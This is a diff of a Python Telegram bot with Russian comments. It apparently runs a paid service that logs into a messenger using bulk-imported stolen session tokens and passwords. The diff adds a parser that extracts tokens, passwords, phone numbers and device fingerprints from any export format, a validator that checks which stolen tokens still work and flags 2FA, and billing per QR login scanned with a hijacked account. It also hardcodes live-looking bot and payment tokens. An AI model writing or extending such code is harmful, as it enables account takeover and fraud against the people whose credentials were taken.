@@ -10,8 +10,11 @@ import socket
 import struct
 import msgpack
 import zipfile
+import re
 import requests
 from io import BytesIO
+from datetime import datetime, timedelta
+from collections import deque
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -19,8 +22,18 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 
-logging.basicConfig(level=logging.INFO)
+# Настройка логирования
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('bot.log'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
 
+# Конфигурация
 BOT_TOKEN = "8786805295:AAFlLKtaJor8KMkffbqP1WnRtPT7D6ZCmdc"
 ADMIN_ID = 8632861931
 CRYPTO_BOT_TOKEN = "590558:AATFDxdtESm34k9IoB2U7TLAo0LQylVdmPo"
@@ -111,7 +124,8 @@ class MaxConnection:
             self._responses.clear()
             threading.Thread(target=self._reader, daemon=True).start()
             return True
-        except:
+        except Exception as e:
+            logger.error(f"Connection failed: {e}")
             return False
 
     def close(self):
@@ -129,7 +143,9 @@ class MaxConnection:
                 self._buffer.extend(chunk)
                 self._parse()
             except socket.timeout: continue
-            except: break
+            except Exception as e:
+                logger.error(f"Reader error: {e}")
+                break
 
     def _parse(self):
         while len(self._buffer) >= Packet.HEADER_SIZE:
@@ -145,7 +161,9 @@ class MaxConnection:
                 if packet.sequence in self._pending:
                     self._responses[packet.sequence] = packet
                     self._pending[packet.sequence].set()
-            except: continue
+            except Exception as e:
+                logger.error(f"Parse error: {e}")
+                continue
 
     def send(self, packet: Packet, wait=True):
         with self._lock:
@@ -165,9 +183,10 @@ class MaxConnection:
         return self._responses.pop(seq, None)
 
 class QRScanner:
-    def __init__(self, token: str, device_id: str):
+    def __init__(self, token: str, device_id: str, device_info: dict = None):
         self.token = token
         self.device_id = device_id or str(uuid.uuid4())
+        self.device_info = device_info or {}
         self.conn = MaxConnection()
 
     def scan(self, track_id: str, qr_link: str) -> dict:
@@ -176,33 +195,38 @@ class QRScanner:
                 return {"success": False, "error": "Connection failed"}
             
             now_ms = int(time.time() * 1000)
+            
+            # Используем device_info если есть
+            user_agent = {
+                "deviceType": self.device_info.get("deviceType", "ANDROID"),
+                "appVersion": self.device_info.get("appVersion", "26.17.1"),
+                "osVersion": self.device_info.get("osVersion", "Android 10"),
+                "timezone": self.device_info.get("timezone", "Europe/Moscow"),
+                "screen": self.device_info.get("screen", "408dpi 1080x2292"),
+                "pushDeviceType": "GCM",
+                "arch": "arm64-v8a",
+                "locale": self.device_info.get("deviceLocale", "ru"),
+                "buildNumber": self.device_info.get("buildNumber", 6712),
+                "deviceName": self.device_info.get("deviceName", "Google Pixel 7"),
+                "deviceLocale": self.device_info.get("deviceLocale", "ru")
+            }
+            
             payload = {
                 "clientSessionId": now_ms & 0x7FFFFFFF,
                 "mt_instanceid": str(uuid.uuid4()),
-                "userAgent": {
-                    "deviceType": "ANDROID", "appVersion": "26.17.1",
-                    "osVersion": "Android 10", "timezone": "Europe/Moscow",
-                    "screen": "408dpi 1080x2292", "pushDeviceType": "GCM",
-                    "arch": "arm64-v8a", "locale": "ru",
-                    "buildNumber": 6712, "deviceName": "Google Pixel 7",
-                    "deviceLocale": "ru"
-                },
+                "userAgent": user_agent,
                 "deviceId": self.device_id
             }
+            
             self.conn.send(Packet(Opcode.SESSION_INIT, pack(payload)))
             time.sleep(0.5)
             
             login_payload = {
-                "token": self.token, "deviceId": self.device_id,
-                "userAgent": {
-                    "deviceType": "ANDROID", "appVersion": "26.17.1",
-                    "osVersion": "Android 10", "timezone": "Europe/Moscow",
-                    "screen": "408dpi 1080x2292", "pushDeviceType": "GCM",
-                    "arch": "arm64-v8a", "locale": "ru",
-                    "buildNumber": 6712, "deviceName": "Google Pixel 7",
-                    "deviceLocale": "ru"
-                }
+                "token": self.token,
+                "deviceId": self.device_id,
+                "userAgent": user_agent
             }
+            
             resp = self.conn.send(Packet(Opcode.LOGIN, pack(login_payload)))
             data = unpack(resp.payload)
             
@@ -227,6 +251,261 @@ class QRScanner:
             return {"success": False, "error": str(e)}
         finally:
             self.conn.close()
+
+# ==================== УНИВЕРСАЛЬНЫЙ ПАРСЕР ТОКЕНОВ ====================
+
+class UniversalTokenParser:
+    """Универсальный парсер для любых форматов экспорта токенов"""
+    
+    @staticmethod
+    def extract_token(text: str) -> str:
+        """Извлекает токен из текста любого формата"""
+        # Паттерны для разных форматов токенов
+        patterns = [
+            r'(?:token|access_token|auth_token)["\s:=]+([A-Za-z0-9\-_=+]{50,})',  # JSON поле token
+            r'(An_[A-Za-z0-9\-_=+]{50,})',  # Токен формата An_...
+            r'(?:^|\s)([A-Za-z0-9\-_=+]{100,})(?:\s|$)',  # Длинная строка похожая на токен
+            r'([A-Za-z0-9+/=]{50,})',  # Base64-like строка
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, text)
+            if match:
+                token = match.group(1)
+                # Проверяем что это не JSON и не служебная строка
+                if not token.startswith('{') and not token.startswith('const') and len(token) > 50:
+                    return token
+        return None
+    
+    @staticmethod
+    def extract_device_info(text: str) -> dict:
+        """Извлекает информацию об устройстве из текста"""
+        device_info = {}
+        
+        # Пытаемся найти JSON объект с информацией об устройстве
+        json_patterns = [
+            r'\{[^}]*"deviceType"[^}]*\}',  # JSON с deviceType
+            r'\{[^}]*"deviceId"[^}]*\}',    # JSON с deviceId
+            r'\{[^}]*"userAgent"[^}]*\}',   # JSON с userAgent
+        ]
+        
+        for pattern in json_patterns:
+            match = re.search(pattern, text, re.DOTALL)
+            if match:
+                try:
+                    data = json.loads(match.group(0))
+                    if "userAgent" in data:
+                        device_info.update(data["userAgent"])
+                    else:
+                        device_info.update(data)
+                    break
+                except:
+                    continue
+        
+        # Если не нашли JSON, ищем отдельные поля
+        if not device_info:
+            fields = {
+                "deviceId": r'"deviceId"\s*:\s*"([^"]+)"',
+                "deviceType": r'"deviceType"\s*:\s*"([^"]+)"',
+                "appVersion": r'"appVersion"\s*:\s*"([^"]+)"',
+                "osVersion": r'"osVersion"\s*:\s*"([^"]+)"',
+                "deviceName": r'"deviceName"\s*:\s*"([^"]+)"',
+                "deviceLocale": r'"deviceLocale"\s*:\s*"([^"]+)"',
+                "buildNumber": r'"buildNumber"\s*:\s*(\d+)',
+                "screen": r'"screen"\s*:\s*"([^"]+)"',
+                "timezone": r'"timezone"\s*:\s*"([^"]+)"',
+            }
+            
+            for field, pattern in fields.items():
+                match = re.search(pattern, text)
+                if match:
+                    if field == "buildNumber":
+                        device_info[field] = int(match.group(1))
+                    else:
+                        device_info[field] = match.group(1)
+        
+        return device_info
+    
+    @staticmethod
+    def extract_password(text: str) -> str:
+        """Извлекает пароль из текста"""
+        patterns = [
+            r'(?:password|pass|pwd)["\s:=]+([^\s\n"]+)',  # JSON поле password
+            r'(?:^|\n)([A-Za-z0-9@#$%^&*!]{4,30})(?:\n|$)',  # Строка похожая на пароль
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, text, re.IGNORECASE)
+            if match:
+                password = match.group(1)
+                # Проверяем что это не токен и не служебная строка
+                if not password.startswith('An_') and len(password) > 3 and len(password) < 50:
+                    return password
+        return ""
+    
+    @staticmethod
+    def extract_phone(text: str) -> str:
+        """Извлекает номер телефона из текста"""
+        patterns = [
+            r'(?:\+?\d{1,3})?[\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}',  # Номер телефона
+            r'"phone"\s*:\s*"([^"]+)"',  # JSON поле phone
+            r'"phoneNumber"\s*:\s*"([^"]+)"',  # JSON поле phoneNumber
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, text)
+            if match:
+                phone = match.group(0) if match.lastindex is None else match.group(1)
+                if len(phone) > 5:
+                    return phone
+        return ""
+    
+    @staticmethod
+    def extract_custom_payload(text: str) -> str:
+        """Извлекает customPayload из текста"""
+        patterns = [
+            r'customPayload\s*=\s*"(\d+)"',
+            r'"customPayload"\s*:\s*"(\d+)"',
+            r'"customPayload"\s*:\s*(\d+)',
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, text, re.IGNORECASE)
+            if match:
+                return match.group(1)
+        return None
+    
+    @staticmethod
+    def parse_text_block(text: str) -> list:
+        """Парсит блок текста содержащий один или несколько токенов"""
+        results = []
+        
+        # Разделяем текст на блоки (разделители: пустые строки, ---, ===)
+        blocks = re.split(r'\n\s*\n|---+|\*\*\*+|===+', text)
+        
+        for block in blocks:
+            block = block.strip()
+            if not block:
+                continue
+            
+            token = UniversalTokenParser.extract_token(block)
+            if not token:
+                continue
+            
+            device_info = UniversalTokenParser.extract_device_info(block)
+            password = UniversalTokenParser.extract_password(block)
+            phone = UniversalTokenParser.extract_phone(block)
+            custom_payload = UniversalTokenParser.extract_custom_payload(block)
+            
+            # Если не нашли device_id, генерируем
+            if "deviceId" not in device_info:
+                device_info["deviceId"] = str(uuid.uuid4())
+            
+            results.append({
+                "token": token,
+                "device_info": device_info,
+                "password": password,
+                "phone": phone or "unknown",
+                "custom_payload": custom_payload
+            })
+        
+        return results
+    
+    @staticmethod
+    def parse_json_data(data) -> list:
+        """Парсит JSON данные разных форматов"""
+        results = []
+        
+        if isinstance(data, list):
+            for item in data:
+                if isinstance(item, dict):
+                    parsed = UniversalTokenParser.parse_single_json(item)
+                    if parsed:
+                        results.append(parsed)
+        elif isinstance(data, dict):
+            # Может быть массив токенов в ключе
+            for key in ["tokens", "accounts", "data", "sessions"]:
+                if key in data and isinstance(data[key], list):
+                    for item in data[key]:
+                        if isinstance(item, dict):
+                            parsed = UniversalTokenParser.parse_single_json(item)
+                            if parsed:
+                                results.append(parsed)
+            
+            # Или один токен
+            parsed = UniversalTokenParser.parse_single_json(data)
+            if parsed:
+                results.append(parsed)
+        
+        return results
+    
+    @staticmethod
+    def parse_single_json(data: dict) -> dict:
+        """Парсит одиночный JSON объект с токеном"""
+        # Ищем токен в разных полях
+        token = None
+        token_fields = ["token", "accessToken", "access_token", "authToken", "auth_token", 
+                       "sessionToken", "session_token", "refreshToken", "refresh_token"]
+        
+        for field in token_fields:
+            if field in data:
+                potential_token = data[field]
+                if isinstance(potential_token, str) and len(potential_token) > 50:
+                    token = potential_token
+                    break
+        
+        # Если не нашли в известных полях, ищем в строковом представлении
+        if not token:
+            json_str = json.dumps(data)
+            token = UniversalTokenParser.extract_token(json_str)
+        
+        if not token:
+            return None
+        
+        # Извлекаем deviceInfo
+        device_info = {}
+        if "userAgent" in data:
+            device_info.update(data["userAgent"])
+        elif "deviceInfo" in data:
+            device_info.update(data["deviceInfo"])
+        elif "device" in data:
+            device_info.update(data["device"])
+        
+        # Извлекаем deviceId
+        device_id = data.get("deviceId") or data.get("device_id") or device_info.get("deviceId")
+        if not device_id:
+            # Ищем в тексте
+            json_str = json.dumps(data)
+            match = re.search(r'"deviceId"\s*:\s*"([^"]+)"', json_str)
+            if match:
+                device_id = match.group(1)
+        
+        if not device_id:
+            device_id = str(uuid.uuid4())
+        
+        device_info["deviceId"] = device_id
+        
+        # Извлекаем остальные данные
+        password = data.get("password") or data.get("pass") or data.get("pwd") or ""
+        phone = data.get("phone") or data.get("phoneNumber") or data.get("phone_number") or ""
+        
+        # Пробуем найти телефон в user или profile
+        if not phone:
+            user_data = data.get("user") or data.get("profile") or {}
+            if isinstance(user_data, dict):
+                phone = user_data.get("phone") or user_data.get("phoneNumber") or ""
+        
+        custom_payload = data.get("customPayload") or data.get("custom_payload")
+        if custom_payload:
+            custom_payload = str(custom_payload)
+        
+        return {
+            "token": token,
+            "device_info": device_info,
+            "password": str(password) if password else "",
+            "phone": str(phone) if phone else "unknown",
+            "custom_payload": custom_payload
+        }
 
 # ==================== ДАННЫЕ ====================
 
@@ -286,28 +565,65 @@ def get_user_group(user_id: int) -> str:
         return None
     return users[uid].get("group_id")
 
+def is_duplicate_token(token: str) -> bool:
+    """Проверка на дубликат токена"""
+    for acc in accounts.values():
+        if acc.get("token") == token:
+            return True
+    return False
+
+def add_account(token: str, device_info: dict, password: str = "", phone: str = "unknown", custom_payload: str = None) -> str:
+    """Добавление аккаунта в базу"""
+    if is_duplicate_token(token):
+        return "duplicate"
+    
+    device_id = device_info.get("deviceId", str(uuid.uuid4()))
+    
+    acc_id = str(uuid.uuid4())[:8]
+    accounts[acc_id] = {
+        "token": token,
+        "device_id": device_id,
+        "phone": phone,
+        "password": password,
+        "device_info": device_info,
+        "custom_payload": custom_payload,
+        "added_at": time.time(),
+        "total_scans": 0
+    }
+    return "added"
+
 # ==================== ВАЛИДАЦИЯ ТОКЕНОВ ====================
 
-async def validate_token(token: str, device_id: str) -> dict:
+async def validate_token(token: str, device_id: str, device_info: dict = None) -> dict:
     """Проверяет, рабочий ли токен"""
-    scanner = QRScanner(token, device_id)
+    scanner = QRScanner(token, device_id, device_info)
     
     try:
         if not scanner.conn.connect():
             return {"valid": False, "error": "Не удалось подключиться к серверу"}
         
         now_ms = int(time.time() * 1000)
+        user_agent = {
+            "deviceType": "ANDROID",
+            "appVersion": "26.17.1",
+            "osVersion": "Android 10",
+            "timezone": "Europe/Moscow",
+            "screen": "408dpi 1080x2292",
+            "pushDeviceType": "GCM",
+            "arch": "arm64-v8a",
+            "locale": "ru",
+            "buildNumber": 6712,
+            "deviceName": "Google Pixel 7",
+            "deviceLocale": "ru"
+        }
+        
+        if device_info:
+            user_agent.update(device_info)
+        
         payload = {
             "clientSessionId": now_ms & 0x7FFFFFFF,
             "mt_instanceid": str(uuid.uuid4()),
-            "userAgent": {
-                "deviceType": "ANDROID", "appVersion": "26.17.1",
-                "osVersion": "Android 10", "timezone": "Europe/Moscow",
-                "screen": "408dpi 1080x2292", "pushDeviceType": "GCM",
-                "arch": "arm64-v8a", "locale": "ru",
-                "buildNumber": 6712, "deviceName": "Google Pixel 7",
-                "deviceLocale": "ru"
-            },
+            "userAgent": user_agent,
             "deviceId": device_id
         }
         
@@ -317,14 +633,7 @@ async def validate_token(token: str, device_id: str) -> dict:
         login_payload = {
             "token": token,
             "deviceId": device_id,
-            "userAgent": {
-                "deviceType": "ANDROID", "appVersion": "26.17.1",
-                "osVersion": "Android 10", "timezone": "Europe/Moscow",
-                "screen": "408dpi 1080x2292", "pushDeviceType": "GCM",
-                "arch": "arm64-v8a", "locale": "ru",
-                "buildNumber": 6712, "deviceName": "Google Pixel 7",
-                "deviceLocale": "ru"
-            }
+            "userAgent": user_agent
         }
         
         resp = scanner.conn.send(Packet(Opcode.LOGIN, pack(login_payload)))
@@ -334,10 +643,7 @@ async def validate_token(token: str, device_id: str) -> dict:
         
         data = unpack(resp.payload)
         
-        logging.info(f"Validate token response: {data} (type: {type(data)})")
-        
         if isinstance(data, (int, float)):
-            logging.info(f"Token valid, user ID: {int(data)}")
             return {"valid": True}
         
         if isinstance(data, list):
@@ -347,56 +653,31 @@ async def validate_token(token: str, device_id: str) -> dict:
                     if first_item.get("passwordChallenge"):
                         return {"valid": True, "has_2fa": True, "warning": "Требуется 2FA"}
                     if "error" in first_item:
-                        error_msg = first_item["error"]
-                        if isinstance(error_msg, str):
-                            if "password" in error_msg.lower() or "2fa" in error_msg.lower():
-                                return {"valid": True, "has_2fa": True, "warning": f"Требуется 2FA: {error_msg}"}
-                            else:
-                                return {"valid": False, "error": error_msg}
-                        return {"valid": False, "error": str(error_msg)}
+                        error_msg = str(first_item["error"])
+                        if "password" in error_msg.lower() or "2fa" in error_msg.lower():
+                            return {"valid": True, "has_2fa": True, "warning": f"Требуется 2FA: {error_msg}"}
+                        return {"valid": False, "error": error_msg}
                 elif isinstance(first_item, (int, float)):
-                    logging.info(f"Token valid, user ID from list: {int(first_item)}")
                     return {"valid": True}
             return {"valid": True}
         
         if isinstance(data, dict):
             if data.get("passwordChallenge"):
                 return {"valid": True, "has_2fa": True, "warning": "Требуется 2FA"}
-            
             if "error" in data:
-                error_msg = data["error"]
-                if isinstance(error_msg, str):
-                    if "password" in error_msg.lower() or "2fa" in error_msg.lower() or "challenge" in error_msg.lower():
-                        return {"valid": True, "has_2fa": True, "warning": f"Требуется 2FA: {error_msg}"}
-                    else:
-                        return {"valid": False, "error": error_msg}
-                elif isinstance(error_msg, dict):
-                    error_text = error_msg.get("message", str(error_msg))
-                    if "password" in error_text.lower() or "2fa" in error_text.lower():
-                        return {"valid": True, "has_2fa": True, "warning": f"Требуется 2FA: {error_text}"}
-                    return {"valid": False, "error": error_text}
-                else:
-                    return {"valid": False, "error": str(error_msg)}
-            
-            if "user" in data or "session" in data or "ok" in data or "id" in data:
-                return {"valid": True}
-            
-            if data:
-                logging.info(f"Token valid, dict response without errors")
-                return {"valid": True}
+                error_msg = str(data["error"])
+                if "password" in error_msg.lower() or "2fa" in error_msg.lower():
+                    return {"valid": True, "has_2fa": True, "warning": f"Требуется 2FA: {error_msg}"}
+                return {"valid": False, "error": error_msg}
+            return {"valid": True}
         
         if data:
-            logging.warning(f"Unknown response structure but treating as valid: {data}")
-            data_str = str(data).lower()
-            if "password" in data_str or "2fa" in data_str or "challenge" in data_str:
-                return {"valid": True, "has_2fa": True, "warning": "Обнаружен 2FA в ответе"}
-            if "error" not in data_str and "invalid" not in data_str:
-                return {"valid": True}
+            return {"valid": True}
         
-        return {"valid": False, "error": f"Неизвестный формат ответа: {type(data)} - {str(data)[:200]}"}
+        return {"valid": False, "error": "Неизвестный формат ответа"}
         
     except Exception as e:
-        logging.error(f"Token validation error: {e}")
+        logger.error(f"Token validation error: {e}")
         return {"valid": False, "error": str(e)}
     finally:
         scanner.conn.close()
@@ -593,12 +874,17 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
         await state.clear()
         return
     
+    # Списываем средства сразу
+    users[owner_uid]["balance"] -= PRICE_PER_QR
+    users[owner_uid]["total_scans"] = users[owner_uid].get("total_scans", 0) + 1
+    save_users()
+    
     acc_id = list(accounts.keys())[0]
     acc = accounts[acc_id]
     
     await msg.edit_text(f"⏳ Сканирую QR...")
     
-    scanner = QRScanner(acc["token"], acc["device_id"])
+    scanner = QRScanner(acc["token"], acc["device_id"], acc.get("device_info"))
     
     result = None
     def do_scan():
@@ -612,11 +898,12 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
         await asyncio.sleep(0.5)
     
     if result is None:
+        # Возвращаем средства при таймауте
+        users[owner_uid]["balance"] += PRICE_PER_QR
+        users[owner_uid]["total_scans"] -= 1
+        save_users()
         await msg.edit_text("❌ Таймаут сканирования")
     elif result.get("success"):
-        users[owner_uid]["balance"] -= PRICE_PER_QR
-        users[owner_uid]["total_scans"] = users[owner_uid].get("total_scans", 0) + 1
-        
         if group_id:
             groups[str(group_id)]["total_scans"] = groups[str(group_id)].get("total_scans", 0) + 1
         
@@ -648,6 +935,10 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
         del accounts[acc_id]
         save_all()
     else:
+        # Возвращаем средства при ошибке
+        users[owner_uid]["balance"] += PRICE_PER_QR
+        users[owner_uid]["total_scans"] -= 1
+        save_users()
         await msg.edit_text(f"❌ Ошибка: {result.get('error', 'неизвестно')}")
     
     await state.clear()
@@ -870,7 +1161,6 @@ async def handle_edit_balance_amount(message: types.Message, state: FSMContext):
             parse_mode="HTML"
         )
         
-        # Уведомляем пользователя об изменении баланса
         try:
             await bot.send_message(
                 user_id,
@@ -895,8 +1185,17 @@ async def cb_admin_upload(callback: types.CallbackQuery):
         return await callback.answer("❌ Только для админа", show_alert=True)
     
     await callback.message.answer(
-        "📦 Отправьте файл с токенами (.txt, .json или .zip)\n"
-        "Формат как при выгрузке ANDROID из основного бота.",
+        "📦 <b>Отправьте файл с токенами</b>\n\n"
+        "<b>Поддерживаемые форматы:</b>\n"
+        "• <code>.txt</code> - любые текстовые форматы токенов\n"
+        "• <code>.json</code> - JSON любого формата\n"
+        "• <code>.zip</code> - архив с файлами\n\n"
+        "<b>Бот автоматически определит формат и извлечёт:</b>\n"
+        "• Токен\n"
+        "• Информацию об устройстве\n"
+        "• Пароль (если есть)\n"
+        "• Номер телефона (если есть)\n\n"
+        "<i>Поддерживаются все форматы экспорта Android!</i>",
         parse_mode="HTML"
     )
     await callback.answer()
@@ -921,6 +1220,7 @@ async def handle_document(message: types.Message):
         
         added = 0
         skipped = 0
+        duplicates = 0
         
         if file_name.endswith('.zip'):
             zip_buffer = BytesIO(file_bytes.read())
@@ -930,24 +1230,28 @@ async def handle_document(message: types.Message):
                         continue
                     try:
                         content = zf.read(inner_file).decode('utf-8')
-                        a, s = process_content(content)
+                        a, s, d = process_content(content)
                         added += a
                         skipped += s
-                    except:
+                        duplicates += d
+                    except Exception as e:
+                        logger.error(f"Error processing {inner_file}: {e}")
                         skipped += 1
         else:
             content = file_bytes.read().decode('utf-8')
-            added, skipped = process_content(content)
+            added, skipped, duplicates = process_content(content)
         
         save_accounts()
         
         await msg.edit_text(
             f"✅ Файл обработан!\n"
             f"➕ Добавлено токенов: {added}\n"
+            f"🔄 Дубликатов: {duplicates}\n"
             f"⏭ Пропущено: {skipped}\n\n"
             f"🔍 Начинаю проверку... Это может занять несколько минут."
         )
         
+        # Проверка токенов
         valid = 0
         invalid = 0
         twofa = 0
@@ -959,7 +1263,11 @@ async def handle_document(message: types.Message):
         
         for acc_id, acc in list(accounts.items()):
             checked += 1
-            result = await validate_token(acc["token"], acc["device_id"])
+            result = await validate_token(
+                acc["token"], 
+                acc["device_id"], 
+                acc.get("device_info")
+            )
             
             if result["valid"]:
                 valid += 1
@@ -972,7 +1280,7 @@ async def handle_document(message: types.Message):
                 to_remove.append(acc_id)
                 error = result.get("error", "неизвестно")
                 phone = acc.get("phone", acc_id[:8])
-                logging.info(f"Invalid token {phone}: {error}")
+                logger.info(f"Invalid token {phone}: {error}")
             
             if checked % 5 == 0 or checked == total:
                 await msg.edit_text(
@@ -1005,75 +1313,109 @@ async def handle_document(message: types.Message):
         await msg.edit_text(result_text, parse_mode="HTML")
         
     except Exception as e:
-        logging.error(f"Upload error: {e}")
+        logger.error(f"Upload error: {e}")
         await msg.edit_text(f"❌ Ошибка: {e}")
 
 def process_content(content: str) -> tuple:
+    """Обработка содержимого файла с токенами (универсальная)"""
     added = 0
     skipped = 0
+    duplicates = 0
     
+    # Пробуем распарсить как JSON
     try:
         data = json.loads(content)
-        if isinstance(data, list):
-            for item in data:
-                if isinstance(item, dict):
-                    if add_account_from_json(item):
-                        added += 1
-                    else:
-                        skipped += 1
-            return added, skipped
-        elif isinstance(data, dict):
-            if add_account_from_json(data):
+        parsed_tokens = UniversalTokenParser.parse_json_data(data)
+        
+        for token_data in parsed_tokens:
+            result = add_account(
+                token=token_data["token"],
+                device_info=token_data["device_info"],
+                password=token_data["password"],
+                phone=token_data["phone"],
+                custom_payload=token_data["custom_payload"]
+            )
+            
+            if result == "added":
                 added += 1
-            return added, skipped
-    except:
+            elif result == "duplicate":
+                duplicates += 1
+            else:
+                skipped += 1
+        
+        if parsed_tokens:
+            return added, skipped, duplicates
+    except json.JSONDecodeError:
         pass
     
-    for line in content.strip().split('\n'):
-        line = line.strip()
-        if not line:
+    # Пробуем каждую строку как JSON
+    lines = content.strip().split('\n')
+    json_objects = []
+    text_blocks = []
+    current_block = []
+    
+    for line in lines:
+        line_stripped = line.strip()
+        if not line_stripped:
+            if current_block:
+                text_blocks.append('\n'.join(current_block))
+                current_block = []
             continue
+        
+        # Проверяем, является ли строка JSON
         try:
-            data = json.loads(line)
-            if isinstance(data, dict) and add_account_from_json(data):
-                added += 1
+            data = json.loads(line_stripped)
+            if isinstance(data, dict):
+                json_objects.append(data)
                 continue
-        except:
+        except json.JSONDecodeError:
             pass
         
-        parts = line.split('|')
-        token = parts[0].strip() if parts else ""
-        if token and len(token) >= 20:
-            acc_id = str(uuid.uuid4())[:8]
-            accounts[acc_id] = {
-                "token": token,
-                "device_id": parts[1].strip() if len(parts) > 1 else str(uuid.uuid4()),
-                "phone": parts[2].strip() if len(parts) > 2 else "unknown",
-                "password": "",
-                "added_at": time.time(),
-                "total_scans": 0
-            }
-            added += 1
-        else:
-            skipped += 1
+        current_block.append(line)
     
-    return added, skipped
-
-def add_account_from_json(data: dict) -> bool:
-    token = data.get("token", "")
-    if not token or len(token) < 20:
-        return False
+    if current_block:
+        text_blocks.append('\n'.join(current_block))
     
-    acc_id = str(uuid.uuid4())[:8]
-    accounts[acc_id] = {
-        "token": token,
-        "device_id": data.get("deviceId", str(uuid.uuid4())),
-        "phone": f"+{data.get('user', {}).get('phone', 'unknown')}",
-        "password": data.get("password", ""),
-        "added_at": time.time(),
-        "total_scans": 0
-    }
-    return True
+    # Обрабатываем JSON объекты
+    for json_obj in json_objects:
+        parsed = UniversalTokenParser.parse_single_json(json_obj)
+        if parsed:
+            result = add_account(
+                token=parsed["token"],
+                device_info=parsed["device_info"],
+                password=parsed["password"],
+                phone=parsed["phone"],
+                custom_payload=parsed["custom_payload"]
+            )
+            
+            if result == "added":
+                added += 1
+            elif result == "duplicate":
+                duplicates += 1
+            else:
+                skipped += 1
+    
+    # Обрабатываем текстовые блоки
+    for block in text_blocks:
+        parsed_tokens = UniversalTokenParser.parse_text_block(block)
+        
+        for token_data in parsed_tokens:
+            result = add_account(
+                token=token_data["token"],
+                device_info=token_data["device_info"],
+                password=token_data["password"],
+                phone=token_data["phone"],
+                custom_payload=token_data["custom_payload"]
+            )
+            
+            if result == "added":
+                added += 1
+            elif result == "duplicate":
+                duplicates += 1
+            else:
+                skipped += 1
+    
+    return added, skipped, duplicates
 
 # ==================== ПРОВЕРКА ТОКЕНОВ ====================
 
@@ -1100,7 +1442,11 @@ async def cb_check_tokens(callback: types.CallbackQuery):
     
     for acc_id, acc in list(accounts.items()):
         checked += 1
-        result = await validate_token(acc["token"], acc["device_id"])
+        result = await validate_token(
+            acc["token"], 
+            acc["device_id"], 
+            acc.get("device_info")
+        )
         
         if result["valid"]:
             valid_count += 1
@@ -1233,8 +1579,23 @@ async def cb_admin_stats(callback: types.CallbackQuery):
     await callback.message.answer(text, parse_mode="HTML")
     await callback.answer()
 
+# ==================== ЗАПУСК ====================
+
 async def main():
-    logging.info("QR Scanner Bot запущен!")
+    logger.info("QR Scanner Bot запущен!")
+    logger.info(f"Загружено аккаунтов: {len(accounts)}")
+    logger.info(f"Загружено пользователей: {len(users)}")
+    logger.info(f"Загружено групп: {len(groups)}")
+    
+    # Автосохранение каждые 5 минут
+    async def auto_save():
+        while True:
+            await asyncio.sleep(300)
+            save_all()
+            logger.info("Данные сохранены автоматически")
+    
+    asyncio.create_task(auto_save())
+    
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
